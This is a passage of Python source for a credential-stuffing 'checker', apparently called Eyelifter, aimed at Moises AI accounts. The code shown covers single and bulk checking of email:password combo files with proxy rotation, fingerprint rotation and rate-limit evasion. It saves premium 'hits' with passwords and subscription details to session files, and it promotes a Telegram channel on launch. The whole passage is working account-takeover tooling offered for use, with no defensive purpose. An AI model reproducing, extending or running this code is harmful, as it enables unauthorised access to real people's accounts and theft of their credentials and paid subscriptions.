        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = Eyelifter_run_with_retries(combo, proxy)
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "✅ PREMIUM" if result["status"] == "hit" else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("UID", u.get("uid", "-")),
            ("Name", u.get("name", "-")),
            ("Country", u.get("country", "-")),
            ("Plan", u.get("plan", "-")),
            ("Is Pro", str(u.get("is_pro"))),
            ("Is Premium", str(u.get("is_premium"))),
            ("Sub Type", u.get("subscription_type", "-")),
            ("Available Credits", str(u.get("available_credits", 0))),
            ("Monthly Usage", str(u.get("current_monthly_usage", 0))),
            ("OnDemand Total", str(u.get("on_demand_total", 0))),
            ("OnDemand Remaining", str(u.get("on_demand_remaining", 0))),
            ("Concurrent Limit", str(u.get("concurrent_limit", 0))),
            ("Is Expiring Soon", str(u.get("is_expiring_soon"))),
            ("Pro Trial Expires", u.get("pro_trial_expires", "-")),
            ("Group Plan Trial", str(u.get("group_plan_free_trial"))),
            ("Expire Date", u.get("expire_date", "-")),
            ("Auto Renew", str(u.get("auto_renew"))),
            ("Plan Cycle", u.get("plan_cycle", "-")),
            ("Provider", u.get("provider_name", "-")),
            ("Gateway", u.get("provider_gateway", "-")),
            ("Pending", str(u.get("pending"))),
            ("Grace Period", u.get("grace_period", "-")),
            ("Already Purchased", str(u.get("already_purchased"))),
            ("Purchased Plans", u.get("purchased_plans", "-")),
            ("Email Verified", str(u.get("email_verified"))),
            ("Auth Providers", u.get("auth_providers", "-")),
            ("Eligible Rewards", str(u.get("is_eligible_rewards"))),
            ("Registered", str(u.get("firebase_registered"))),
            ("Account Created", u.get("created_at", "-")),
            ("Last Signin", u.get("last_signin", "-")),
            ("Hit Reasons", u.get("hit_reasons", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "moises_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "moises_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "moises_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "moises_errors.txt"), "w", encoding="utf-8")

    header = (f"# Moises AI Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s "
                  f"debug:{CONFIG['debug']} rotate_fp:{CONFIG['rotate_fingerprint']}")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad_proxies = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()

    try:
        Eyelifter_bulk_runner(combos)
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("moises_hits.txt", "hits"),
        ("moises_free.txt", "free"),
        ("moises_bad.txt", "bad"),
        ("moises_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")
    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (premium)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:              {CONFIG['threads']}")
    print(f"  [2]  Timeout:              {CONFIG['timeout']}s")
    print(f"  [3]  Retries:              {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:          {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:          {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff:   {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:       {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:           {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:      {CONFIG['skip_proxy_test']}")
    print(f"  [10] Rotate Fingerprint:   {CONFIG['rotate_fingerprint']}")
    print(f"  [11] Open Channel Launch:  {CONFIG['open_channel_on_launch']}")
    print(f"  [12] Debug:                {CONFIG['debug']}")
    print(f"  [13] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(50, int(input("Threads (1-50): "))))
            _loader.settings["threads"] = CONFIG["threads"]; changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(120, int(input("Timeout (5-120): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]; changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(5, int(input("Retries (0-5): "))))
            _loader.settings["retries"] = CONFIG["retries"]; changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]; changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]; changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]; changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]; changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v; changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]; changed = True
        elif ch == "10":
            CONFIG["rotate_fingerprint"] = not CONFIG["rotate_fingerprint"]
            _loader.settings["rotate_fingerprint"] = CONFIG["rotate_fingerprint"]; changed = True
        elif ch == "11":
            CONFIG["open_channel_on_launch"] = not CONFIG["open_channel_on_launch"]
            _loader.settings["open_channel_on_launch"] = CONFIG["open_channel_on_launch"]; changed = True
        elif ch == "12":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]; changed = True
        elif ch == "13":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_main():
    Eyelifter_verify("main")

    if CONFIG.get("open_channel_on_launch", True):
        def _delayed_open():
            time.sleep(0.4)
            Eyelifter_open_url("https://t.me/darkhuchannel")
        threading.Thread(target=_delayed_open, daemon=True).start()

    Eyelifter_banner(TOOL_NAME, "Moises AI Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)